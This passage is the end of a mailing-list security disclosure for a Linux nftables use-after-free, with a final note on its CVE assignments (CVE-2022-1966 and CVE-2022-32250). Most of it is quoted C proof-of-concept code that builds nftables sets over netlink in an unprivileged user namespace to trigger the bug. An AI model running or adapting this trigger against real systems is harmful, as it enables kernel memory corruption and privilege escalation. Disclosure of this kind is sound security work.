+>     nftnl_expr_set_str(exprs[exprid], NFTNL_EXPR_LOOKUP_SET, "set_stable");
+>     nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);
+>     // nest the expression into the set
+>     nftnl_set_add_expr(set_trigger, exprs[exprid]);
+>     exprid++;
+> 
+>     // trigger the buggy look up again (this just duplicates the above)
+>     // this set will also fail, and will write the address of the expression to
+>     // the free chunk, which will trigger kasan
+>     set_name = "set_uaf";
+>     nftnl_set_set_str(set_uaf, NFTNL_SET_TABLE, table_name);
+>     nftnl_set_set_str(set_uaf, NFTNL_SET_NAME, set_name);
+>     nftnl_set_set_u32(set_uaf, NFTNL_SET_FLAGS, NFT_SET_EXPR);
+>     nftnl_set_set_u32(set_uaf, NFTNL_SET_KEY_LEN, 1);
+>     nftnl_set_set_u32(set_uaf, NFTNL_SET_FAMILY, family);
+>     nftnl_set_set_u32(set_uaf, NFTNL_SET_ID, set_id);
+>     exprs[exprid] = nftnl_expr_alloc("lookup");
+>     nftnl_expr_set_str(exprs[exprid], NFTNL_EXPR_LOOKUP_SET, "set_stable");
+>     nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);
+>     nftnl_set_add_expr(set_uaf, exprs[exprid]);
+>     exprid++;
+> 
+>     // serialize
+>     char buf[MNL_SOCKET_BUFFER_SIZE*2];
+> 
+>     struct mnl_nlmsg_batch * batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
+>     int seq = 0;
+> 
+>     nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
+>     mnl_nlmsg_batch_next(batch);
+> 
+>     struct nlmsghdr * nlh;
+> 
+>     // add table
+>     nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
+> NFT_MSG_NEWTABLE, family, 0, seq++);
+>     nftnl_table_nlmsg_build_payload(nlh, table);
+>     mnl_nlmsg_batch_next(batch);
+> 
+>     // add set_stable
+>     nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
+>                                     NFT_MSG_NEWSET, family,
+>                                     NLM_F_CREATE|NLM_F_ACK, seq++);
+>     nftnl_set_nlmsg_build_payload(nlh, set_stable);
+>     nftnl_set_free(set_stable);
+>     mnl_nlmsg_batch_next(batch);
+> 
+>     // add set_trigger
+>     nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
+>                                     NFT_MSG_NEWSET, family,
+>                                     NLM_F_CREATE|NLM_F_ACK, seq++);
+>     nftnl_set_nlmsg_build_payload(nlh, set_trigger);
+>     nftnl_set_free(set_trigger);
+>     mnl_nlmsg_batch_next(batch);
+> 
+>     // add set_uaf
+>     nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
+>                                     NFT_MSG_NEWSET, family,
+>                                     NLM_F_CREATE|NLM_F_ACK, seq++);
+>     nftnl_set_nlmsg_build_payload(nlh, set_uaf);
+>     nftnl_set_free(set_uaf);
+>     mnl_nlmsg_batch_next(batch);
+> 
+>     nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
+>     mnl_nlmsg_batch_next(batch);
+> 
+>     struct mnl_socket * nl = mnl_socket_open(NETLINK_NETFILTER);
+>     if (nl == NULL) {
+>         err(1, "mnl_socket_open");
+>     }
+> 
+>     if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
+> mnl_nlmsg_batch_size(batch)) < 0) {
+>         err(1, "mnl_socket_send");
+>     }
+>     printf("should have triggered KASAN\n");
+> }
+> 
+> int
+> main(int argc, char ** argv)
+> {
+>     unshare_setup(getuid(), getgid());
+>     netfilter();
+>     return 0;
+> }
+> 
+
+FTR, this was assigned CVE-2022-1966 by Red Hat:
+https://bugzilla.redhat.com/show_bug.cgi?id=2092427 .
+
+There is though as well now
+https://www.cve.org/CVERecord?id=CVE-2022-32250 . I have asked MITRE
+to possibly reject the later one.
+
+Regards,
+Salvatore
